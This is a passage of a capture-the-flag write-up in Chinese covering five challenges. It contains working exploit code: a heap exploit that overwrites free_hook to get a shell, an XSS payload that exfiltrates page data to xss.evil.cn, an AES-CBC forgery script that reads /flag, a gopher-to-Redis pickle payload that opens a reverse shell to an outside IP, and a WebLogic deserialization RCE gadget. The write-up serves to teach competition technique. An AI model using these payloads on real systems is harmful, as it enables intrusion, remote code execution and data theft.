    }, 1000)
    }
    //alert(a)
    magic()
## easyheap
很明显add时，size获得时有逻辑问题
前后没有进行更新，导致可以任意偏移写一字节”\x00”
利用0x20大小的chunk，和size逻辑问题绕过memset和00截断，直接利用unsorted bin进行leak
而后通过任意偏移写一字节”\x00”，布置好堆布局，恰好修改到一个tcache_free_chunk的fd低字节为00，即可分配到一个构造好chunk的位置，这里我修改fd后恰好指向chunk本身，人为构造了double
free的堆布局
而后tcache attack修改free_hook为system即可在free(“/bin/sh”)时getshell
    from pwn import *
    context.log_level="debug"
    def add(size,note):
        p.sendlineafter(">> ","1")
        p.sendlineafter(": ",str(size))
        p.sendafter(": ",note)
    def show(index):
       p.sendlineafter(">> ","2")
       p.sendlineafter(": ",str(index))
    def delete(index):
       p.sendlineafter(">> ","3")
       p.sendlineafter(": ",str(index))
    #p=process("./easyheap")
    p=remote("123.57.209.176",30774)
    add(3,"aaa")
    add(3,"aaa")
    delete(0)
    delete(1)
    p.sendlineafter(">> ","1")
    p.sendlineafter(": ",str(0x100))
    p.sendlineafter(": ",str(1))
    p.sendafter(": ","a")
    show(0)
    p.recvuntil("Content: ")
    heap=u64(p.recv(6)+"\x00\x00")
    print hex(heap)
    delete(0)
    for i in range(8):
        add(0x80,"a"*0x80)
    for i in range(8):
        delete(7-i)
    add(8,"/bin/sh\x00")
    add(3,"aaa")
    p.sendlineafter(">> ","1")
    p.sendlineafter(": ",str(0x100))
    p.sendlineafter(": ",str(1))
    p.sendafter(": ","a")
    show(2)
    p.recvuntil("Content: ")
    libc=u64(p.recv(6)+"\x00\x00")+0x7ffff7dd7000-0x7ffff7fc2c61
    print hex(libc)
    p.sendlineafter(">> ","1")
    p.sendlineafter(": ",str(0x91))
    p.sendlineafter(": ",str(0x80))
    p.sendafter(": ","b"*0x80)
    add(0x80,p64(libc+0x01eeb28).ljust(0x80,"\x00"))
    add(0x80,p64(libc+0x01eeb28).ljust(0x80,"\x00"))
    add(0x80,p64(libc+0x0055410)+"\n")
    delete(0)
    p.interactive()
## douyin_video
 通过正则写的bug，可以跳到任意 www.douyin.com
开头的网站，之后就是xss
在macos上测试，因为 resp.headers[‘X-Frame-Options’] = ‘sameorigin’
同源策略，b.bytectf.live 不会被加载，检测 frames[0].frames.length
即可，但是打远程不成功，之后在linux环境下测试。。。发现居然不检测子域名是否同源，所以无法xsleak。但是发现也不检测端口是否同源，又因为document.domain被提升，直接就能在30002的guestbook上读30001上的document。。。
提交到 c.bytectf.live:30002，然后让bot跳过去就行
    i = document.createElement('iframe')
    i.src = 'http://b.bytectf.live:30001/send?keyword=Byte'
    document.domain = 'bytectf.live'
    document.body.append(i)
    setTimeout(() => {
    a = i.contentWindow.document.body.innerHTML
    fetch('http://xss.evil.cn/?' + escape(a))
    }, 2000)
## secure_website
点开发现路径全部是一串hex，随便改点啥返回，crypto/cipher: input not full blocks
修改不同的地方会出现不同的结果
有
No file.
Bad Request.
File expired.
几种，有部分文件在修改时会出现
    3a4)A®=º.~J³b!F¡(a96 file, 3a4f6aa5-f42c-4aa1-8a96
这种乱码，同时可以注意到 3a4, a96是正确的，乱码的长度是16，而且在对unhex后的16位chunk里面的任意一个修改都会导致乱码。
对这可以确定是用的分组密码，大概率是AES，又注意到在修改的时候对着chunk的第一位修改，会导致结果16位乱码之后的第一位变动，可以推断出是AES-CBC。
这里直接给了解密的结果，而且iv是已知的，只不过用错了一个，根据CBC原理可以直接恢复正确的解密结果，脚本的print(strxor(strxor(decdata,
iv), orgiv))就是解密的结果。
    import requests
    import binascii
    from Crypto.Util.strxor import strxor
    session = requests.session()
    url = "http://39.102.70.108:30080/"
    burp0_cookies = {"session": "MTYwMzYwNDU5NHxEdi1CQkFFQ180SUFBUkFCRUFBQU5mLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRCa0FGelZoWkRWbU5XSmxMV1ppTnprdE5HVTJNeTFoTUdSaXxtdMibdvk_cMqwoIhQBYT1yNIvNef_Fdw2aIqaAaSO-w=="}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36", "DNT": "1", "Accept": "text/css,*/*;q=0.1", "Referer": "http://182.92.174.109:30080/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7", "sec-gpc": "1", "Connection": "close"}
    a = 'cbba9c7866cb8ecd9bcbd398f95adcb2f5e830cd6bc057ad15267934624b1d73fbc3a5e6ab72093379f72f4c7e030bc476c3da8d1b69bb1f6f764823627097d6393cdd1f956f416edab58a071069b982e2162060ac228744d19189904f452d4a922146b886c6e97b11151124ad47f46e'
    a = binascii.unhexlify(a)
    #a = '73ffb490b0d9f2266a5c673406593ab473b7f3d3b887fd21285e66735a0e34f39a70397ef6d08779d30fcd93bc79685e70a4e76ab7e44a52ac79aa409002f3972661bca9328ef5e243a321a1f10ce03711795ba4bfb46a39e633d66749d83ccdcc7a0a2a2a9b32ee96b9c6ce19bbf7a3'
    start_idx = 64
    front = a[:start_idx]
    back = a[start_idx+16:]
    org = a[start_idx:start_idx+16]
    dec_idx =32
    dec = a[dec_idx:dec_idx+16]
    orgiv = a[dec_idx-16:dec_idx]
    iv = front[-16:]
    a = front + dec + org + back
    res = session.get(url + binascii.hexlify(a).decode(), headers=burp0_headers, cookies=burp0_cookies)
    print(res.text)
    data = res.content
    decdata = data[11:11+16]
    print(decdata)
    print(strxor(strxor(decdata, iv), orgiv))
    b'/file?filename=statics/css/lightbox.css&user=76bed7be-b111-413f-'
    b'/file?filename=statics/css/lightbox.css&user=3de920c2-a0f2-4af3-959a&expire\x7f\x0c\xf0\xb0\xb33608963\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    b'/file?filename=statics/css/lightbox.css&user=3de920c2-a0f2-4af3-959a&expired=1603609302\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    raw_dec = strxor(decdata, iv)
    print(raw_dec)
    poc1 = b'/file?filename=/'
    poc2 = b'flag&aaaaaaaaaaa'
    #poc3 = b'e&aaaaa&user=3de'
    poc = poc1
    print(strxor(poc, raw_dec))
    print(binascii.hexlify(strxor(poc, raw_dec)))
    # ec8547904a5316352d4bb4fd42e3eca13e2e8d10b1698d2c6624844c76c92fbe0000000000000000000000000000000070a4e76ab7e44a52ac79aa409002f3972661bca9328ef5e243a321a1f10ce03711795ba4bfb46a39e633d66749d83ccdcc7a0a2a2a9b32ee96b9c6ce19bbf7a3
    # b'\x89\xa3}\x80\xf2\x14\x9e\x94\x1e@\xd7|\\\r\xd7}' ^ b'p\xa4\xe7j\xb7\xe4JR\xacy\xaa@\x90\x02\xf3\x97'
    # rawdec b'\xf9\x07\x9a\xeaE\xf0\xd4\xc6\xb29}<\xcc\x0f$\xea'
    # ccfa723eeacaf36488126a24310abbfae7e525c32ed219af073437396a4d1466fbc3a5e6ab72093379f72f4c7e030bc476c3da8d1b69bb1f6f764823627097d6393cdd1f956f416edab58a071069b982e2162060ac228744d19189904f452d4a922146b886c6e97b11151124ad47f46e
    '''
    GET /ccfa723eeacaf36488126a24310abbfae7e525c32ed219af073437396a4d1466fbc3a5e6ab72093379f72f4c7e030bc476c3da8d1b69bb1f6f764823627097d6393cdd1f956f416edab58a071069b982e2162060ac228744d19189904f452d4a922146b886c6e97b11151124ad47f46e HTTP/1.1
    Host: 39.102.70.108:30080
    DNT: 1
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7
    Cookie: session=MTYwMzYwNDU5NHxEdi1CQkFFQ180SUFBUkFCRUFBQU5mLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRCa0FGelZoWkRWbU5XSmxMV1ppTnprdE5HVTJNeTFoTUdSaXxtdMibdvk_cMqwoIhQBYT1yNIvNef_Fdw2aIqaAaSO-w==
    sec-gpc: 1
    Connection: close
    '''
可以得到加密的其实就是
    b'/file?filename=statics/css/lightbox.css&user=3de920c2-a0f2-4af3-959a&expired=1603609302\x00\x00\x00\x00\x00\x00\x00\x00\x00'
PS. 这里不知道为什么有时候会得到错误的解密结果，比如statihs, filenamn之类的，但换了session之后又正常了。。也不知道怎么回事  
于是在已知当前解密结果外加iv的情况下，可以修改前一chunk来伪造当前chunk的解密结果，可以不停往前重复，伪造全部的结果。就是脚本后半部分的作用，太懒没有自动化，需要手工替换下front
+ dec + org + back 中的 dec和poc1,2,3来伪造。最后尝试读 /etc/passwd 成功，想着读读程序，但是读
/proc/self/cmdline失败，于是直接尝试读/flag，直接就出了
## scrapy
题目是个scrapy，提交url会爬，同时会抓取页面内的链接再爬一次。
猜测抓的a标签会request请求一次，于是测了一下file，发现可以任意读。
fuzz了很多，environ能看到pwd是/code，结合scrapy的项目结构，读了一下scrapy.cfg发现能读到。
    # Automatically created by: scrapy startproject
    #
    # For more information about the [deploy] section see:
    # https://scrapyd.readthedocs.io/en/latest/deploy.html
    ​
    [settings]
    default = bytectf.settings
    ​
    [deploy]
    #url = http://localhost:6800/
    project = bytectf
可以看到没开6800，结合project继续读，何以读到整个项目代码，发现用了mongo和redis。但是scrapy.Request是不支持gopher/dict的，这里就有点卡住了，后来测出来/result路由的请求支持gopher，想到了gopher打redis/mongo。  
gopher打redis，主从/crontab都没成，没回显很缺信息。
gopher打mongo restapi，没成，不知道为啥。
stuck
审了一波scrapy没有找到能完全可控的写pickle序列化字节码操作，后来看代码发现用了spider_redis就翻了一下，发现很明显的scrapy_redis在使用priority_queue等进行请求调度的存取url的过程中，是pickle.dump以后存的，取的时候也直接pickle.load。。。。。
可以看到是一个有序集合，zadd一个url就行。。注意self.key
然后生成弹shell exp，gopher打就行
    /result?url=gopher://172.20.0.7:6379/_zadd%2520byte%253Arequests%25201%2520%2522%255Cx80%255Cx03cposix%255Cnsystem%255Cnq%255Cx00X%255Cxe9%255Cx00%255Cx00%255Cx00python%2520-c%2520%255C'import%2520socket%252Csubprocess%252Cos%253Bs%253Dsocket.socket(socket.AF_INET%252Csocket.SOCK_STREAM)%253Bs.connect((%255C%2522139.199.203.253%255C%2522%252C1234))%253Bos.dup2(s.fileno()%252C0)%253B%2520os.dup2(s.fileno()%252C1)%253B%2520os.dup2(s.fileno()%252C2)%253Bp%253Dsubprocess.call(%255B%255C%2522%252Fbin%252Fbash%255C%2522%252C%255C%2522-i%255C%2522%255D)%253B%255C'q%255Cx01%255Cx85q%255Cx02Rq%255Cx03.%2522
## jvav
一开始以为没开t3/iiop，以为直接来白嫖http 1day的。。。。。。。。。
后来发现https，参考weblogic_cmd改了一下支持t3s的操作，然后14644一把梭就行。注意coherence版本。
    public static Object doBlind14644(String c) throws Exception {
        String command = null;
        if (c.startsWith("linux=")) {
            command = "Runtime.getRuntime().exec(new String []{\"/bin/bash\",\"-c\",\"" + c.replace("linux=", "") + "\"});";
        }
    ​
        if (c.startsWith("win=")) {
            command = "Runtime.getRuntime().exec(new String []{\"cmd.exe\",\"/c\",\"" + c.replace("win=", "") + "\"});";
        }
    ​
        String r = getRandomString(10);
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("com.tangosol.internal.util.invoke.lambda.AbstractRemotableLambda$" + r);
        if (!clazz.isFrozen()) {
            pool.importPackage("java.lang.Runtime");
            CtConstructor cons = new CtConstructor(new CtClass[0], clazz);
            String cmd = "{" + command + "}";
            cons.setBody(cmd);
            clazz.addConstructor(cons);
        }
    ​
        ClassIdentity classIdentity = new ClassIdentity();
        Reflections.setFieldValue(classIdentity, "m_sPackage", "com.tangosol.internal.util.invoke.lambda");
        Reflections.setFieldValue(classIdentity, "m_sBaseName", "AbstractRemotableLambda");
        Reflections.setFieldValue(classIdentity, "m_sVersion", r);
        RemoteConstructor constructor = new RemoteConstructor(new ClassDefinition(classIdentity, clazz.toBytecode()), new Object[0]);
        return constructor;
    }